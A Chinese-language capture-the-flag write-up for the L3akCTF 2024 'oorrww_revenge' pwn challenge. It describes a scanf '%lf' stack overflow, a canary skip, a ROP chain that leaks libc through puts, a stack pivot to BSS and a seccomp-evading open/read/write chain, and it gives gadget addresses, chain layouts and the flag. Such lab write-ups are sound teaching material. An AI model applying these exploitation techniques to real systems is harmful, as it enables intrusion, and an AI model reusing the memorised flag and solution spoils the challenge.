# L3akCTF 2024 oorrww_revenge Writeup

## 题目简述

Revenge 版移除了主动地址泄露，但仍用 `%lf` 向栈缓冲区连续写 30 个 double：

```c
char idx[0x90];
for (int i = 0; i <= 29; i++) {
    scanf("%lf", &idx[i * 8]);
}
```

二进制关闭 PIE，保留 NX、canary 和 Full RELRO；seccomp 仍禁止 `execve`、`execveat`。固定代码地址和 GOT/PLT 可用，因此先构造一段小 ROP 泄露 libc，再让程序从 `_start` 重启，第二轮把完整 ORW 链读入固定 BSS。

## 解题过程

### 1. 精确跳过 canary

反汇编可见 `idx` 实际位于 `rbp-0xa0`，canary 位于 `rbp-0x8`。因此：

```text
index 0..18  -> 缓冲区及其后填充
index 19     -> canary
index 20     -> saved RBP
index 21     -> saved RIP
```

向 `%lf` 输入 `-` 会转换失败而不写内存。第一阶段连续发送 21 个 `-`，保留缓冲区、canary 和保存的 RBP，从 index 21 开始覆盖返回地址。

### 2. 借 gifts 中间指令泄露 puts

源码特意在 `init` 中放入不可达指令，留下：

```text
0x401203: pop rax
0x401204: ret
```

`gifts` 内部还存在：

```text
0x4012da: mov rdi, rax
0x4012dd: call puts@plt
...
pop rbp
ret
```

于是第一阶段链为：

```text
pop rax ; ret
puts@got
gifts+0x0f       # mov rdi, rax ; call puts@plt
若干 ret         # 同时给 pop rbp 提供占位并校正栈
_start
```

`puts` 把 GOT 表项中的实际函数指针按字节输出，接收前 6 字节并补零即可：

```python
puts_addr = u64(io.recv(6).ljust(8, b"\x00"))
libc.address = puts_addr - libc.sym["puts"]
```

最后返回 `_start`，运行时会再次进入 `main`，得到完整的第二轮 30 次输入。

### 3. 读入 BSS 并迁移栈

第二轮先发送 20 个 `-`，保留到 canary 为止；index 20 覆盖保存的 RBP 为固定可写地址 `0x404400`。返回地址处布置：

```text
pop rdi ; ret
0
pop rsi ; ret
0x404400
pop rdx ; pop rbx ; ret
0x200
0x200
read
leave ; ret
```

这段链调用 `read(0, bss, 0x200)`，然后以 BSS 为新栈。发送到 BSS 的数据首 qword 是新的 RBP 占位，后面依次执行：

```text
open("flag.txt", 0)
read(3, bss + 0x200, 0x50)
write(2, bss + 0x200, 0x50)
```

文件名放在同一 BSS payload 末尾。所有栈上 ROP 值仍需先按 IEEE-754 位模式转换成 double 文本；只有通过 `read` 写入 BSS 的第二阶段数据可以直接发送原始字节。

最终得到：

```text
L3AK{n0w_u_hav3_th3_k3y_t0_th3_inv1s1ble_ffllaagg}
```

## 方法总结

- 无 PIE 时，应优先寻找“寄存器装载 gadget + 现有函数内部片段”，即使二进制没有标准 `pop rdi; ret`，也能组合出 GOT 泄露。
- 回到 `_start` 可以重新获得一次存在次数限制的输入循环，是常见的多阶段利用技巧。
- 第一阶段只负责建立 libc 基址；第二阶段先用 `read` 把不受 `%lf` 编码约束的原始 ROP 链放进 BSS，再迁移过去，明显简化 payload。
